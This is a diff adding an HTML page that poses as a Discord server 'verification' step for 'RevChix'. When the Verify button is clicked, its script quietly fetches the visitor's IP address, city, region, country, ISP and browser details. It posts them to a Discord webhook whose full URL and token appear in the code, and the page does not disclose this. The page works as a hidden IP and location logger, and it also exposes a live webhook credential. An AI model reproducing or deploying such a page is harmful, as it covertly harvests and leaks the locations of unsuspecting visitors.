@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>RevChix Verification</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <style>
+    * { box-sizing: border-box; }
+
+    body {
+      margin: 0;
+      background: url('wwee.gif') no-repeat center center fixed;
+      background-size: cover;
+      font-family: 'Segoe UI', sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      overflow: hidden;
+      color: #fff;
+    }
+
+    .card {
+      background: rgba(10, 10, 10, 0.85);
+      padding: 30px 40px;
+      border-radius: 16px;
+      box-shadow: 0 0 30px rgba(0, 0, 0, 0.6);
+      text-align: center;
+      width: 90%;
+      max-width: 400px;
+      animation: fadeInUp 1s ease-out;
+    }
+
+    @keyframes fadeInUp {
+      0% { opacity: 0; transform: scale(0.9) translateY(30px); }
+      100% { opacity: 1; transform: scale(1) translateY(0); }
+    }
+
+    .brand {
+      font-weight: bold;
+      font-size: 20px;
+      margin-bottom: 20px;
+      overflow: hidden;
+      white-space: nowrap;
+      border-right: 2px solid #5b4dff;
+      width: 100%;
+      margin: auto;
+      animation: typing 2s steps(30, end), blink-caret 0.75s step-end infinite;
+    }
+
+    @keyframes typing {
+      from { width: 0 }
+      to { width: 100% }
+    }
+
+    @keyframes blink-caret {
+      from, to { border-color: transparent }
+      50% { border-color: #5b4dff; }
+    }
+
+    .brand a {
+      color: #ffffff;
+      text-decoration: none;
+    }
+
+    .brand a:hover {
+      text-decoration: underline;
+    }
+
+    .verify-btn {
+      background-color: #5b4dff;
+      color: white;
+      border: none;
+      border-radius: 12px;
+      padding: 12px 25px;
+      font-weight: bold;
+      font-size: 15px;
+      margin-top: 20px;
+      width: 100%;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      box-shadow: 0 0 10px #5b4dff;
+    }
+
+    .verify-btn:hover {
+      background-color: #7a69ff;
+      box-shadow: 0 0 20px #7a69ff;
+      transform: scale(1.03);
+    }
+
+    .footer {
+      margin-top: 20px;
+      font-size: 12px;
+      color: #aaa;
+    }
+
+    #discordID {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="brand">
+      RevChix | <a href="https://discord.gg/TFz84fKZWj" target="_blank">discord.gg/revchix</a>
+    </div>
+
+    <input type="hidden" id="discordID" value="686375691876302870" />
+    <button class="verify-btn" onclick="verifyUser()">Verify</button>
+    <div class="footer">© owner jay dinosaur</div>
+  </div>
+
+  <script>
+    function getBrowserInfo() {
+      const ua = navigator.userAgent;
+      if (ua.includes("Chrome")) return "Chrome on " + navigator.platform;
+      if (ua.includes("Firefox")) return "Firefox on " + navigator.platform;
+      if (ua.includes("Safari")) return "Safari on " + navigator.platform;
+      if (ua.includes("Edge")) return "Edge on " + navigator.platform;
+      if (ua.includes("OPR") || ua.includes("Opera")) return "Opera on " + navigator.platform;
+      return "Unknown on " + navigator.platform;
+    }
+
+    function verifyUser() {
+      const discordID = document.getElementById("discordID").value.trim();
+      if (!discordID || !/^\d{17,19}$/.test(discordID)) {
+        alert("Invalid Discord ID");
+        return;
+      }
+
+      // Step 1: Call your backend to assign role
+      fetch("https://revchix-verify.onrender.com/verify", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ discordID })
+      })
+      .then(res => res.json())
+      .then(data => {
+        if (data.success) {
+          logToWebhook(discordID); // Step 2: Log to webhook
+          document.querySelector(".verify-btn").textContent = "Verifying...";
+          setTimeout(() => {
+            window.location.href = "https://discord.gg/TFz84fKZWj";
+          }, 2000);
+        } else {
+          alert("❌ Failed: " + data.error);
+        }
+      })
+      .catch(err => {
+        alert("Error connecting to verification server.");
+      });
+    }
+
+    function logToWebhook(discordID) {
+      fetch("https://ipapi.co/json")
+        .then(res => res.json())
+        .then(data => {
+          const webhook = "https://discord.com/api/webhooks/1385992301863768234/r19JGqKV0TC6beZ9AbipJ-d59dRpN86y_1DZ3OdjVUeNyTMgGvh4JMaWlbyNAC5b39Ll";
+          const timestamp = `<t:${Math.floor(Date.now() / 1000)}:F>`;
+          const content =
+            `🛡️ **RevChix Verification Access**\n` +
+            `👤 **Discord ID**: <@${discordID}>\n` +
+            `🌐 **IP**: ||\`${data.ip}\`||\n` +
+            `📍 **Location**: ${data.city}, ${data.region}, ${data.country_name}\n` +
+            `📡 **ISP**: ${data.org}\n` +
+            `💻 **Device**: ${getBrowserInfo()}\n` +
+            `🕒 **Time**: ${timestamp}`;
+
+          fetch(webhook, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ content })
+          });
+        });
+    }
+  </script>
+</body>
+</html>
